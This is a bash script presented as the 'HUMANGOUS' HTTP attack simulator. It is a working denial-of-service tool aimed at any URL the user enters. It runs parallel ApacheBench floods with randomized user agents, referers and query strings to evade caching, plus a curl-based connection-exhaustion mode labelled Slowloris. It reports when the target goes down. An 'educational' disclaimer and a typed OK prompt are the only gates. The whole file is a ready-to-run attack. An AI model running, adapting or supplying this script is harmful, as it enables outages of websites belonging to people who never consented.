#!/bin/bash

# Colors for output
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ASCII art for HUMANGOUS
ASCII_ART=$(cat << 'EOF'
  _          _ _       
 | |__   ___| | | ___ 
 | '_ \ / __| | |/ _ \
 | | | | (__| | |  __/
 |_| |_| \___|_|_|\___|
EOF
)

# User agents for randomization
USER_AGENTS=(
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/14.1.1"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Android 11; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0"
)

# Referers for randomization
REFERERS=(
    "http://www.google.com/?q="
    "http://www.bing.com/search?q="
    "http://search.yahoo.com/search?p="
    "http://www.duckduckgo.com/?q="
)

check_tools() {
    if ! command -v ab >/dev/null 2>&1; then
        echo -e "${RED}Error: apache2-utils (ab) not found. Install it with 'sudo apt install apache2-utils'.${NC}"
        exit 1
    fi
    if ! command -v curl >/dev/null 2>&1; then
        echo -e "${RED}Error: curl not found. Install it with 'sudo apt install curl'.${NC}"
        exit 1
    fi
}

validate_url() {
    local url="$1"
    if ! [[ $url =~ ^(https?://)?[a-zA-Z0-9.-]+(:[0-9]+)?(/[a-zA-Z0-9._-]*)?$ ]]; then
        echo -e "${RED}Error: Invalid URL format (e.g., http://example.com).${NC}"
        exit 1
    fi
    if ! [[ $url =~ ^https?:// ]]; then
        url="http://$url"
    fi
    # Test URL reachability
    if ! curl -s -o /dev/null --head --connect-timeout 5 "$url"; then
        echo -e "${RED}Error: URL $url is unreachable.${NC}"
        exit 1
    fi
    echo "$url"
}

check_downtime() {
    local url="$1"
    if ! curl -s -o /dev/null --head --connect-timeout 3 "$url"; then
        echo -e "${GREEN}Successfully Down: Target $url is unresponsive!${NC}"
        flag=2
    fi
}

generate_payload() {
    # Generate random query string (e.g., ?paramX=valueY)
    local param=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c $((RANDOM % 10 + 5)))
    local value=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c $((RANDOM % 10 + 5)))
    echo "?$param=$value"
}

http_flood() {
    local url="$1"
    local requests="$2"
    local concurrency="$3"
    local duration="$4"
    echo -e "${CYAN}Starting HTTP Flood Attack on $url (Requests: $requests, Concurrency: $concurrency, Duration: ${duration}s)...${NC}"
    
    # Run multiple ab instances for distributed attack simulation
    local instances=4
    local requests_per_instance=$((requests / instances))
    local pids=()
    for ((i=1; i<=instances; i++)); do
        payload=$(generate_payload)
        ab -n "$requests_per_instance" -c "$concurrency" \
           -H "User-Agent: ${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}" \
           -H "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" \
           -H "Referer: ${REFERERS[$((RANDOM % ${#REFERERS[@]}))]}$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 8)" \
           -H "Cache-Control: no-cache" \
           -H "Connection: keep-alive" \
           -t "$duration" \
           "$url$payload" >/dev/null 2>&1 &
        pids+=($!)
        echo -e "${CYAN}Started attack instance $i (PID: ${pids[-1]})${NC}"
    done
    monitor_attack "${pids[*]}" "$requests" "$url" "$duration"
}

slowloris_attack() {
    local url="$1"
    local connections="$2"
    local duration="$3"
    echo -e "${CYAN}Starting Slowloris Attack on $url (Connections: $connections, Duration: ${duration}s)...${NC}"
    
    local i=0
    local pids=()
    while [ $i -lt $connections ] && [ $flag -lt 2 ]; do
        payload=$(generate_payload)
        curl -s -o /dev/null \
             -A "${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}" \
             -H "Connection: keep-alive" \
             -H "Keep-Alive: $((RANDOM % 11 + 110))" \
             -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
             --max-time "$duration" \
             --data "$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c $((RANDOM % 50 + 50)))" \
             "$url$payload" &
        pids+=($!)
        ((i++))
        ((request_counter++))
        if [ $((request_counter % 100)) -eq 0 ]; then
            echo -e "${CYAN}Opened $request_counter connections${NC}"
        fi
        sleep 0.02
    done
    monitor_attack "${pids[*]}" "$connections" "$url" "$duration"
}

monitor_attack() {
    local pids="$1"
    local total_requests="$2"
    local url="$3"
    local duration="$4"
    local start_time=$(date +%s)
    local previous=$request_counter
    while [ $flag -lt 2 ]; do
        current_time=$(date +%s)
        elapsed=$((current_time - start_time))
        if [ $elapsed -ge $duration ]; then
            flag=2
        fi
        if [ $((request_counter - previous)) -ge 500 ]; then
            echo -e "${CYAN}$request_counter Requests/Connections Sent (Elapsed: ${elapsed}s)${NC}"
            previous=$request_counter
            check_downtime "$url"
        fi
        if [ $request_counter -ge $total_requests ]; then
            flag=2
        fi
        local running=0
        for pid in $pids; do
            if ps -p "$pid" >/dev/null 2>&1; then
                running=1
            fi
        done
        if [ $running -eq 0 ]; then
            flag=2
        fi
        check_downtime "$url"
        sleep 1
    done
    echo -e "${GREEN}\n-- HUMANGOUS Attack Finished --${NC}"
    echo -e "${GREEN}Total Requests/Connections: $request_counter${NC}"
    echo -e "${GREEN}Duration: $elapsed seconds${NC}"
    check_downtime "$url"
    for pid in $pids; do
        kill -9 "$pid" 2>/dev/null
    done
}

main() {
    check_tools
    
    echo -e "${CYAN}$ASCII_ART${NC}"
    echo -e "${GREEN}HUMANGOUS: Advanced HTTP Attack Simulator${NC}"
    echo -e "${YELLOW}Created by Ajay Bommidi for educational purposes${NC}"
    echo -e "${RED}[!] WARNING: This tool is for EDUCATIONAL SIMULATION ONLY.${NC}"
    echo -e "${RED}Unauthorized use is ILLEGAL and UNETHICAL. Use only on systems you own or have explicit permission to test.${NC}"
    read -p "$(echo -e ${YELLOW}'I UNDERSTAND AND AGREE' to continue Type 'OK': ${NC})" confirm
    if [ "$confirm" != "OK" ]; then
        echo -e "${RED}Aborted: Confirmation not provided.${NC}"
        exit 1
    fi
    
    read -p "$(echo -e ${YELLOW}Enter target URL \(e.g., http://example.com\): ${NC})" url
    url=$(validate_url "$url")
    
    read -p "$(echo -e ${YELLOW}Enter attack duration in seconds \(e.g., 60\): ${NC})" duration
    if ! [[ $duration =~ ^[0-9]+$ ]] || [ $duration -lt 10 ] || [ $duration -gt 3600 ]; then
        echo -e "${RED}Error: Duration must be a number between 10 and 3600 seconds.${NC}"
        exit 1
    fi
    
    echo -e "${YELLOW}Select attack type:${NC}"
    echo -e "${WHITE}1. HTTP Flood (Take down website with high-volume requests)${NC}"
    echo -e "${WHITE}2. Slowloris (Crash server by exhausting connections)${NC}"
    read -p "$(echo -e ${YELLOW}Enter choice \(1/2\): ${NC})" attack_type
    
    # Settings for maximum impact
    requests=20000  # Total requests/connections
    concurrency=500  # Concurrent connections for HTTP Flood
    request_counter=0
    flag=0
    
    echo -e "${CYAN}-- Starting HUMANGOUS Attack on $url --${NC}"
    if [ "$attack_type" == "1" ]; then
        http_flood "$url" "$requests" "$concurrency" "$duration"
    elif [ "$attack_type" == "2" ]; then
        slowloris_attack "$url" "$requests" "$duration"
    else
        echo -e "${RED}Invalid attack type. Exiting.${NC}"
        exit 1
    fi
    wait
}

main

